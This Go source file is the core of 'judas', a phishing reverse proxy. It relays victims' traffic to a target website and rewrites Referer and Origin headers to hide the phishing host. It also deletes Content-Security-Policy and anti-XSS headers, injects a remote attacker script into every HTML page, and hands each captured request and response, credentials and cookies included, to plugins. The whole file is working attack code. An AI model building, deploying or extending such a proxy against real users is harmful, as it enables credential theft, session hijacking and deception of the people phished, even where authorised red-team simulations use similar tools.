package judas

import (
	"bytes"
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"github.com/valyala/bytebufferpool"
)

// phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
// It is meant to be embedded in a httputil.ReverseProxy, with the Director and ModifyResponse functions.
type phishingProxy struct {
	TargetURL     *url.URL
	JavascriptURL string
	Logger        *log.Logger
}

type bufferPool struct {
	*bytebufferpool.ByteBuffer
}

// Get massages a *bytebufferpool.ByteBuffer{} into a httputil.BufferPool.
func (b *bufferPool) Get() []byte {
	return b.Bytes()
}

func (b *bufferPool) Put(payload []byte) {
	b.Set(payload)
}

// Director updates a request to be sent to the target website
func (p *phishingProxy) Director(request *http.Request) {
	// We need to do all other header processing before we change the host, otherwise updates will not happen correctly.
	// Damn you, mutable state.
	// Don't let a stray referer header give away the location of our site.
	// Note that this will not prevent leakage from full URLs.
	referer := request.Referer()
	if referer != "" {
		referer = strings.Replace(referer, request.Host, p.TargetURL.Host, 1)
		request.Header.Set("Referer", referer)
	}

	// Don't let a stray origin header give us away either.
	origin := request.Header.Get("Origin")
	if origin != "" {
		origin = strings.Replace(origin, request.Host, p.TargetURL.Host, 1)
		request.Header.Set("Origin", origin)
	}

	request.URL.Scheme = p.TargetURL.Scheme
	request.URL.Host = p.TargetURL.Host
	request.Host = p.TargetURL.Host

	if _, ok := request.Header["User-Agent"]; !ok {
		// explicitly disable User-Agent so it's not set to default value
		request.Header.Set("User-Agent", "")
	}

	// Go supports gzip compression, but not Brotli.
	// Since the underlying transport handles compression, remove this header to avoid problems.
	request.Header.Del("Accept-Encoding")
	request.Header.Del("Content-Encoding")
}

// ModifyResponse updates a response to be passed back to the victim so they don't notice they're on a phishing website.
func (p *phishingProxy) ModifyResponse(response *http.Response) error {
	err := p.modifyLocationHeader(response)
	if err != nil {
		return err
	}

	if p.JavascriptURL != "" {
		err = p.injectJavascript(response)
		if err != nil {
			return err
		}
	}

	// Stop CSPs and anti-XSS headers from ruining our fun
	response.Header.Del("Content-Security-Policy")
	response.Header.Del("X-XSS-Protection")
	return nil
}

func (p *phishingProxy) modifyLocationHeader(response *http.Response) error {
	location, err := response.Location()
	if err != nil {
		if err == http.ErrNoLocation {
			return nil
		}
		return err
	}

	// Turn it into a relative URL
	location.Scheme = ""
	location.Host = ""
	response.Header.Set("Location", location.String())
	return nil
}

func (p *phishingProxy) injectJavascript(response *http.Response) error {
	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
		return nil
	}

	// Prevent NewDocumentFromReader from closing the response body.
	responseText, err := ioutil.ReadAll(response.Body)
	responseBuffer := bytes.NewBuffer(responseText)
	response.Body = ioutil.NopCloser(responseBuffer)
	if err != nil {
		return err
	}

	document, err := goquery.NewDocumentFromResponse(response)
	if err != nil {
		return err
	}

	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
	selection := document.
		Find("head").
		AppendHtml(payload).
		Parent()

	html, err := selection.Html()
	if err != nil {
		return err
	}
	response.Body = ioutil.NopCloser(bytes.NewBufferString(html))
	return nil
}

// InterceptingTransport sends the HTTP exchange to the loaded plugins.
type InterceptingTransport struct {
	http.RoundTripper
	Plugins   *PluginBroker
	TargetURL *url.URL
}

// RoundTrip executes the HTTP request and sends the exchange to judas's loaded plugins
func (t *InterceptingTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if t.Plugins != nil {
		err := t.Plugins.TransformRequest(req)
		if err != nil {
			return nil, err
		}
	}

	// Keep the request around for the plugins
	request := &Request{Request: req}
	clonedRequest, err := request.CloneBody(context.Background())
	if err != nil {
		return nil, err
	}

	resp, err := t.RoundTripper.RoundTrip(req)
	if err != nil {
		return nil, err
	}

	// If we haven't loaded any plugins, don't bother cloning the request or anything.
	if t.Plugins == nil {
		return resp, nil
	}

	response := &Response{Response: resp}
	clonedResponse, err := response.CloneBody()
	if err != nil {
		return nil, err
	}

	httpExchange := &HTTPExchange{
		Request:  clonedRequest,
		Response: clonedResponse,
		Target:   t.TargetURL,
	}

	err = t.Plugins.SendResult(httpExchange)
	if err != nil {
		return nil, err
	}

	err = t.Plugins.TransformResponse(resp)
	return resp, err
}

// ProxyServer exposes the reverse proxy over HTTP.
type ProxyServer struct {
	reverseProxy *httputil.ReverseProxy
	logger       *log.Logger
}

// HandleRequests reverse proxies all traffic to the target server.
func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
	p.reverseProxy.ServeHTTP(w, r)
}

// New returns a HTTP handler configured for phishing.
func New(config *Config) *ProxyServer {
	phishingProxy := &phishingProxy{
		TargetURL:     config.TargetURL,
		JavascriptURL: config.JavascriptURL,
		Logger:        config.Logger,
	}

	reverseProxy := &httputil.ReverseProxy{
		Director:       phishingProxy.Director,
		ModifyResponse: phishingProxy.ModifyResponse,
		ErrorLog:       config.Logger,
		Transport:      config.Transport,
		BufferPool:     &bufferPool{ByteBuffer: &bytebufferpool.ByteBuffer{}},
	}

	return &ProxyServer{
		reverseProxy: reverseProxy,
		logger:       config.Logger,
	}
}
